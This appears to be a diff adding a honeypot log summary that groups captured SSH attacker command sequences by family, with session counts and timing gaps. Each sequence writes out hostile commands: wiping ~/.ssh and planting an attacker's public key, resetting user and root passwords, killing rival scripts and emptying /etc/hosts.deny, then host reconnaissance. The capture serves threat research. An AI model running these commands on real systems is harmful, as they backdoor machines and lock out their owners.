+  gaps (s): [3.112, 8.717, 2.89, 3.014, 3.428, 2.714, 3.018, 2.918, 3.157, 3.307, 3.064, 3.096, 3.12, 3.327, 3.177, 2.95, 2.814]
+
+=== family c6da0f07a0a0ce9f  sequence 5886d153b8cd0f2b  sessions=6  ips=6  exact_variants=6  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "guest\nNmZFJcJTDzq1\nNmZFJcJTDzq1"|passwd|bash
+   5. echo "guest\nNmZFJcJTDzq1\nNmZFJcJTDzq1\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.905, 7.403, 2.803, 2.731, 2.968, 2.733, 2.746, 2.778, 3.11, 2.816, 2.539, 3.229, 2.945, 2.612, 3.094, 2.866, 3.021]
+
+=== family c6da0f07a0a0ce9f  sequence 7b66ae4a7d96b0ac  sessions=6  ips=6  exact_variants=6  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "webapp\n683oXYCipSB6\n683oXYCipSB6"|passwd|bash
+   5. echo "webapp\n683oXYCipSB6\n683oXYCipSB6\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.556, 7.384, 3.047, 3.325, 2.802, 3.527, 2.833, 3.319, 2.72, 2.955, 2.89, 2.859, 2.97, 2.987, 3.061, 2.794, 2.917]
+
+=== family c6da0f07a0a0ce9f  sequence a25cb4d2e480d9ec  sessions=6  ips=6  exact_variants=6  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:XmiXXfDrLpO7"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. lscpu | grep Model
+  17. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [1.84, 6.958, 1.779, 1.689, 1.825, 1.858, 1.795, 1.795, 1.677, 1.697, 1.838, 1.709, 1.77, 2.416, 11.638, 1.749]
+
+=== family c6da0f07a0a0ce9f  sequence a80860dd74eeb14b  sessions=6  ips=6  exact_variants=1  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   5. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   6. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   7. ls -lh $(which ls)
+   8. crontab -l
+   9. w
+  10. uname -m
+  11. cat /proc/cpuinfo | grep model | grep name | wc -l
+  12. top
+  13. uname
+  14. uname -a
+  15. whoami
+  16. lscpu | grep Model
+  17. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [0.923, 16.688, 10.124, 1.007, 1.548, 0.923, 1.481, 0.933, 1.505, 1.467, 0.923, 1.011, 0.974, 0.933, 1.018, 0.926]
+
+=== family c6da0f07a0a0ce9f  sequence 03923a78ef542dfd  sessions=5  ips=5  exact_variants=5  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "ftpuser\n6NmqwumIzpHx\n6NmqwumIzpHx"|passwd|bash
+   5. echo "ftpuser\n6NmqwumIzpHx\n6NmqwumIzpHx\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.851, 9.5, 3.957, 4.022, 3.873, 4.211, 3.603, 4.156, 4.102, 4.034, 4.357, 3.755, 4.247, 3.908, 3.78, 3.962, 3.814]
+
+=== family c6da0f07a0a0ce9f  sequence 0c1dcb00195dfc82  sessions=5  ips=5  exact_variants=5  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "Password@123\nSWvYuoEcsV75\nSWvYuoEcsV75"|passwd|bash
+   5. echo "Password@123\nSWvYuoEcsV75\nSWvYuoEcsV75\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.767, 7.977, 2.625, 2.568, 2.651, 2.354, 2.647, 2.477, 2.669, 2.595, 3.051, 2.376, 2.518, 2.652, 2.672, 2.436, 2.859]
+
+=== family c6da0f07a0a0ce9f  sequence 1feaa19db1ec3227  sessions=5  ips=5  exact_variants=5  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:A6vXDO9M8Jnl"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   7. ls -lh $(which ls)
+   8. crontab -l
+   9. w
+  10. uname -m
+  11. cat /proc/cpuinfo | grep model | grep name | wc -l
+  12. top
+  13. uname
+  14. uname -a
+  15. whoami
+  16. lscpu | grep Model
+  17. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [4.187, 13.943, 1.623, 1.196, 7.737, 0.713, 0.789, 0.688, 0.751, 0.803, 0.76, 0.773, 0.749, 0.751, 0.696, 0.793]
+
+=== family c6da0f07a0a0ce9f  sequence 2fa92a93ed27fef3  sessions=5  ips=5  exact_variants=5  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "qazwsx\nlKxglvrFpX8D\nlKxglvrFpX8D"|passwd|bash
+   5. echo "qazwsx\nlKxglvrFpX8D\nlKxglvrFpX8D\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.312, 7.35, 3.07, 3.286, 3.608, 3.6, 3.117, 3.409, 2.856, 3.265, 3.136, 3.257, 3.104, 3.402, 3.682, 3.628, 3.99]
+
+=== family c6da0f07a0a0ce9f  sequence 4af9a28a06b8c080  sessions=5  ips=5  exact_variants=5  lines=17
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:5bwQ1elBXIG5"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. w
+  10. uname -m
+  11. cat /proc/cpuinfo | grep model | grep name | wc -l
+  12. top
+  13. uname
+  14. uname -a
+  15. whoami
+  16. lscpu | grep Model
+  17. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [2.201, 9.37, 3.529, 2.09, 2.314, 2.562, 2.311, 16.92, 2.47, 2.381, 1.548, 1.897, 3.608, 1.738, 1.517, 1.743]
+
+=== family c6da0f07a0a0ce9f  sequence 7c344513540cda4d  sessions=5  ips=5  exact_variants=5  lines=18
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo -e "test@123\nr4FFIhagY2Ut\nr4FFIhagY2Ut"|passwd|bash
+   5. echo "test@123\nr4FFIhagY2Ut\nr4FFIhagY2Ut\n"|passwd
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  15. uname -a
+  16. whoami
+  17. lscpu | grep Model
+  18. df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
+  gaps (s): [3.41, 10.317, 3.654, 5.069, 4.449, 4.459, 3.644, 5.14, 3.069, 4.906, 3.07, 2.849, 3.318, 3.196, 2.746, 3.132, 3.143]
+
+=== family c6da0f07a0a0ce9f  sequence 91e05101d85f1fe0  sessions=5  ips=5  exact_variants=5  lines=14
+   1. cd ~; chattr -ia .ssh; lockr -ia .ssh
+   2. cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXx
+   3. cat /proc/cpuinfo | grep name | wc -l
+   4. echo "root:FBVGYik7lNet"|chpasswd|bash
+   5. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
+   6. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+   7. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+   8. ls -lh $(which ls)
+   9. crontab -l
+  10. w
+  11. uname -m
+  12. cat /proc/cpuinfo | grep model | grep name | wc -l
+  13. top
+  14. uname
+  gaps (s): [3.209, 13.946, 2.745, 3.414, 2.778, 2.934, 2.986, 3.087, 3.229, 3.373, 2.738, 2.838, 3.403]
+
